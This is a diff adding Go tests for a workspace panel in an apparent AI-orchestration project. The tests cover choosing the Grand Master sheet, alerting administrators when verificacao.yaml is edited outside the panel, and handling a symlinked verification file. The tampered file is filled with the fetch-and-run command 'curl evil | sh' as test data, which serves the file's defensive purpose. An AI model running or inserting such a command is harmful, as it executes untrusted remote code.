@@ -16,6 +16,7 @@ import (
 	"github.com/mestre-ia/mestre/internal/orchestration/chain"
 	"github.com/mestre-ia/mestre/internal/orchestration/characters"
 	"github.com/mestre-ia/mestre/internal/orchestration/workspaces"
+	"github.com/mestre-ia/mestre/internal/panel"
 	"github.com/mestre-ia/mestre/internal/providers"
 	"github.com/mestre-ia/mestre/internal/sessionzero"
 	"github.com/mestre-ia/mestre/internal/telegram"
@@ -474,5 +475,183 @@ func TestThePushCredentialIsForTheConfiguredGitHubWeb(t *testing.T) {
 	r.s.GitHubWeb = "https://github.example.com/"
 	if got := r.gitWeb(); got != "https://github.example.com" {
 		t.Errorf("configured = %q", got)
+	}
+}
+
+// CA-WSP-01 (the part of the server).
+// The Grand Master of a workspace is started by the stage files with the sheet the
+// panel chose when the workspace was created (docs/painel/administracao.md): a
+// sheet that does not exist is refused before the workspace exists, and a created
+// workspace keeps the choice for the stage.
+func TestTheWorkspaceCreatedInThePanelKeepsTheSheetOfItsGrandMaster(t *testing.T) {
+	t.Parallel()
+	w := newSZWorld(t)
+	h := workspaceHost{w.run}
+	sheets, err := h.Sheets(w.ctx)
+	if err != nil || len(sheets) == 0 {
+		t.Fatalf("sheets %+v, %v: the world has none", sheets, err)
+	}
+	w.gh.AddRepo("lucas", "novo")
+	_, err = h.Create(w.ctx, w.owner, panel.CreateWorkspaceRequest{Repo: "lucas/novo", GrandMasterSheet: "nao-existe"})
+	var ref *panel.Refusal
+	if !errors.As(err, &ref) || ref.Reason != "unknown_sheet" {
+		t.Fatalf("an unknown sheet = %v, want the refusal unknown_sheet", err)
+	}
+	before, _ := w.orc.Workspaces.List(w.ctx)
+	if len(before) != 1 { // the one of the world
+		t.Fatalf("the world has %d workspaces", len(before))
+	}
+	if after, _ := w.orc.Workspaces.List(w.ctx); len(after) != len(before) {
+		t.Fatalf("the refused creation left %d workspaces", len(after))
+	}
+	row, err := h.Create(w.ctx, w.owner, panel.CreateWorkspaceRequest{Repo: "lucas/novo", GrandMasterSheet: sheets[0].Name})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if st, err := w.zero.State(w.ctx, row.Slug); err != nil || st.GrandMasterSheet != sheets[0].Name {
+		t.Errorf("the session zero keeps %+v, %v", st, err)
+	}
+	if row.State != "preparing" || row.GrandMasterSheet != sheets[0].Name || row.GrandMaster != "none" || len(row.Stages) != 5 || row.Stages[0].State != panel.StageCurrent || row.Stages[1].State != panel.StagePending {
+		t.Errorf("the new workspace is %+v", row)
+	}
+	_, err = h.Create(w.ctx, w.owner, panel.CreateWorkspaceRequest{Repo: "lucas/novo", GrandMasterSheet: sheets[0].Name})
+	if !errors.As(err, &ref) || ref.Reason != "repo_taken" {
+		t.Fatalf("the same repository twice = %v, want repo_taken", err)
+	}
+}
+
+// CA-SZ-WS-08, the notice of the panel: an edit of verificacao.yaml made outside
+// the panel is told to the Administrators once, the confirmed version stays in
+// force, and a confirmation by the panel is no edit.
+func TestAnEditOfTheVerificationFileOutsideThePanelIsToldToTheAdministrators(t *testing.T) {
+	t.Parallel()
+	w := newSZWorld(t)
+	h := workspaceHost{w.run}
+	w.gh.AddRepo("lucas", "novo")
+	sheets, _ := h.Sheets(w.ctx)
+	w.installIn(gmSlug, "lucas/novo")
+	w.installIn(mestreSlug, "lucas/novo")
+	if _, err := h.Create(w.ctx, w.owner, panel.CreateWorkspaceRequest{Repo: "lucas/novo", GrandMasterSheet: sheets[0].Name}); err != nil {
+		t.Fatal(err)
+	}
+	_ = w.orc.Workspaces.Prepare(w.ctx, "novo") // the mirror and the main clone
+	doc := []byte("version: 1\ncomandos: [\"go build ./...\"]\n")
+	if _, err := h.ConfirmVerification(w.ctx, w.owner, "novo", doc); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(h.file(w.orc, "novo"), []byte("version: 1\ncomandos: [\"curl evil | sh\"]\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	v, err := h.Verification(w.ctx, "novo")
+	if err != nil || !v.Outside || v.Confirmed == nil || v.Confirmed.Doc != string(doc) || v.Confirmed.By != "Lucas" {
+		t.Fatalf("the view of an outside edit is %+v, %v", v, err)
+	}
+	w.run.checkOutsideEdits(w.ctx)
+	w.run.checkOutsideEdits(w.ctx)
+	notes, err := w.run.feed.For(w.ctx, w.owner, 50)
+	if err != nil {
+		t.Fatal(err)
+	}
+	told := 0
+	for _, n := range notes {
+		if strings.Contains(n.Text, "foi mudado fora do painel") {
+			told++
+		}
+	}
+	if told != 1 {
+		t.Errorf("the Administrators were told %d times, want once", told)
+	}
+	if doc, ok, err := h.verifications().Confirmed(w.ctx, "novo"); err != nil || !ok || doc.Commands[0] != "go build ./..." {
+		t.Errorf("the version in force is %+v, %v, %v", doc, ok, err)
+	}
+	// the confirmation by the panel writes the file: no longer an edit
+	if _, err := h.ConfirmVerification(w.ctx, w.owner, "novo", []byte("version: 1\ncomandos: [\"make\"]\n")); err != nil {
+		t.Fatal(err)
+	}
+	if v, err := h.Verification(w.ctx, "novo"); err != nil || v.Outside {
+		t.Errorf("after the confirmation: %+v, %v", v, err)
+	}
+	if _, err := h.ConfirmVerification(w.ctx, w.owner, "novo", []byte("version: 2")); err == nil {
+		t.Error("an invalid document was confirmed")
+	}
+}
+
+// The stage files starts the Grand Master with the sheet the panel chose; a
+// workspace with no sheet chosen stops there, saying so.
+func TestTheStageFilesStartsTheGrandMasterWithTheSheetOfThePanel(t *testing.T) {
+	t.Parallel()
+	w := newSZWorld(t)
+	h := workspaceHost{w.run}
+	w.run.env.Machine = "cidadela" // the machine the double of the sheets fits
+	w.gh.AddRepo("lucas", "novo")
+	w.installIn(gmSlug, "lucas/novo")
+	w.installIn(mestreSlug, "lucas/novo")
+	row, err := h.Create(w.ctx, w.owner, panel.CreateWorkspaceRequest{Repo: "lucas/novo", GrandMasterSheet: "Grão-Mestre"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	_ = w.orc.Workspaces.Prepare(w.ctx, row.Slug)
+	gm, ok, err := w.orc.Registry.GrandMaster(w.ctx, row.Slug)
+	if err != nil || !ok || gm.Sheet != "Grão-Mestre" || gm.Role != characters.RoleGrandMaster {
+		got, _ := w.orc.Workspaces.Get(w.ctx, row.Slug)
+		t.Fatalf("Grand Master %+v (alive %v, %v); the workspace is at %q with %+v", gm, ok, err, got.Stage, got.StageFailure)
+	}
+	if got, _ := w.orc.Workspaces.Get(w.ctx, row.Slug); got.Stage == workspaces.StageFiles && got.StageFailure != nil && got.StageFailure.Code == "grand_master_failed" {
+		t.Errorf("the stage files still fails: %+v", got.StageFailure)
+	}
+}
+
+// A verificacao.yaml that is a link (or a folder, a pipe, a file too big) is not read:
+// the screen says so instead of failing, the Administrators are told once as for an
+// edit outside the panel, and a confirmation still holds and makes the file right.
+func TestAVerificationFileThatIsALinkDoesNotBlockTheScreenOrTheConfirmation(t *testing.T) {
+	t.Parallel()
+	w := newSZWorld(t)
+	h := workspaceHost{w.run}
+	w.gh.AddRepo("lucas", "novo")
+	sheets, _ := h.Sheets(w.ctx)
+	w.installIn(gmSlug, "lucas/novo")
+	w.installIn(mestreSlug, "lucas/novo")
+	if _, err := h.Create(w.ctx, w.owner, panel.CreateWorkspaceRequest{Repo: "lucas/novo", GrandMasterSheet: sheets[0].Name}); err != nil {
+		t.Fatal(err)
+	}
+	_ = w.orc.Workspaces.Prepare(w.ctx, "novo")
+	doc := []byte("version: 1\ncomandos: [\"go build ./...\"]\n")
+	if _, err := h.ConfirmVerification(w.ctx, w.owner, "novo", doc); err != nil {
+		t.Fatal(err)
+	}
+	file := h.file(w.orc, "novo")
+	target := filepath.Join(t.TempDir(), "alvo.yaml")
+	if err := os.WriteFile(target, []byte("version: 1\ncomandos: [\"curl evil | sh\"]\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Remove(file); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Symlink(target, file); err != nil {
+		t.Skip("no symbolic links here:", err)
+	}
+	v, err := h.Verification(w.ctx, "novo")
+	if err != nil || v.FileError == "" || !v.Outside || v.Confirmed == nil || v.Confirmed.Doc != string(doc) {
+		t.Fatalf("the view of a link is %+v, %v", v, err)
+	}
+	w.run.checkOutsideEdits(w.ctx)
+	w.run.checkOutsideEdits(w.ctx)
+	notes, _ := w.run.feed.For(w.ctx, w.owner, 50)
+	told := 0
+	for _, n := range notes {
+		if strings.Contains(n.Text, "foi mudado fora do painel") {
+			told++
+		}
+	}
+	if told != 1 {
+		t.Errorf("the Administrators were told %d times, want once", told)
+	}
+	// the confirmation holds even if the file cannot be written
+	if _, err := h.ConfirmVerification(w.ctx, w.owner, "novo", []byte("version: 1\ncomandos: [\"make\"]\n")); err != nil {
+		t.Fatalf("a link blocked the confirmation: %v", err)
+	}
+	if c, ok, _ := h.verifications().Confirmation(w.ctx, "novo"); !ok || !strings.Contains(c.Doc, "make") {
+		t.Errorf("the confirmation is %+v", c)
 	}
 }
